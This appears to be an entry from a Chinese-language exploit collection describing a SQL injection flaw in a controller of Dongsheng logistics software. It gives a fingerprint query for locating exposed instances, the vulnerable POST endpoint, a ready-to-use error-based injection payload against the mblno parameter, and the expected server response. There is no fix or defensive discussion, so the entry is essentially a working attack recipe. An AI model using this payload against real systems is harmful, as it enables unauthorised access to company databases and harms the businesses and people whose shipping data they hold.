# 东胜物流软件MsOpSeaeController存在SQL注入漏洞

东胜物流软件 ｜ SQL注入 ｜ —
- **指纹**：`app="东胜物流软件-物流软件"`
- **请求**：`POST /MvcShipping/MsOpSeae/GetMblIsRepeat HTTP/1.1`

**Payload**
```
bsno=1&mblno=1’and +1<@@VERSION--+-
```
- **响应特征**：500